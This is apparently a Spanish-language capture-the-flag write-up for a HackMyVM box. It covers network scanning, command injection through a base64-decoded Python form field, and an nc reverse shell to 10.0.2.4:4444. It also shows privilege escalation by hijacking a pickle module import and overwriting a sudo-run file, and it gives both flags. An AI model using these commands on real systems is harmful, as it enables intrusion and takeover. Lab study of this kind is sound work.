
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.93 -oN escaneo
echo "system('nc 10.0.2.4 4444 -e /bin/sh')" | base64
```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abierto unicamente el puerto 80.
![[Pasted image 20240312160453.png]]
Vemos una web con un formulario que te dice los pétalos de diferentes flores.
![[Pasted image 20240312162030.png]]
Así que vamos a burpsuite y enviamos la petición al repeater para ver que respuesta nos da dependiendo de lo que enviemos con el objetivo de un RCE.
![[Pasted image 20240312162129.png]]
Pasamos el valor de burpsuite a decimal y vemos que se trata de una suma.
![[Pasted image 20240312162211.png]]
Así intentaremos ejecutar comandos codificados en base 64 para obtener luego una reverse shell, tras un rato vemos que se trata un python que está ejecutando comandos que podemos verlo usando la funcion system(id) que nos devuelve el id.
![[Pasted image 20240312162810.png]]
![[Pasted image 20240312162821.png]]
Finalmente codificamos una reverse shell y la llamamos en nuestra máquina local conectandonos así a la víctima.
![[Pasted image 20240312163625.png]]
Ahora hacemos el tratamiento de la TTY y conseguimos la siguiente shell.
![[Pasted image 20240312163756.png]]
```bash
sudo -l
cd /home/rose/diary/
nano pickle.py
chmod +x pickle.py
sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
```
A continuación vemos que haciendo un sudo -l tenemos permisos sudo en python3 en el archivo diary.py el cual miramos que usa un comando llamado pickle.
![[Pasted image 20240312164831.png]]
Así que nos creamos un script de python llamado pickle que invoque una shell de rosa
![[Pasted image 20240312164930.png]]
Y ejecutamos como sudo diary.py y obtenemos una shell como rose consiguiendo así la flag de user.
```bash
cd
cat user.txt
sudo -l
echo '/bin/bash' > .plantbook
sudo /bin/bash /home/rose/.plantbook
cat /root/root.txt
```
![[Pasted image 20240312165122.png]]
Vemos que el archivo .plantbook tiene permisos sudo y además que tenemos permisos de escritura por tanto modificaremos ese archivo para que quede así.
![[Pasted image 20240312165900.png]]
Una vez lo hemos modificado lo ejecutaremos como sudo y obtendremos la shell de root y también encontramos su flag
![[Pasted image 20240312165953.png]]

Flag de user: HMV{R0ses_are_R3d$}
Flag de root HMV{R0ses_are_als0_black.}